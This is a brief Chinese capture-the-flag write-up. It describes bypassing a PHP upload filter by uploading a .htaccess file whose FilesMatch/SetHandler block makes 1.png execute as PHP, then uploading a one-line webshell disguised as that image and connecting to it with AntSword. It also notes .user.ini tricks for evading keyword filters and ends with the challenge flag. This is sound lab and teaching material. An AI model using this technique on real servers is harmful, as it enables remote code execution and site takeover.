1. 访问，默认页面是有文件上传功能，尝试上传，php无法上传，图片可以上传，尝试上传配置文件，.user.ini，.htaccess，都上传成功了
2. 上传编辑好的.htaccess文件即可，顺便说一下：

   ```
   .user.ini作为httpd.conf配置文件的补充，可以利用上传.user.ini，来实现对apache配置修改,例如开启php短标签，绕过文件中对php关键字的过滤
   .htaccess是一个分布式配置文件，作用于本目录，有解析文件，重定向的功能
   ```

   .htaccess文件利用

   ```
   <FilesMatch "1.png">
   SetHandler application/x-httpd-php
   </FilesMatch>
   ```

   将1.png用php解析
3. 上传利用文件.htaccess后，在上传一个一句话木马（重命名为1.png）
4. 蚁剑连接

`flag{dbd81acf-4beb-4be1-aa62-9826172efcc9}`
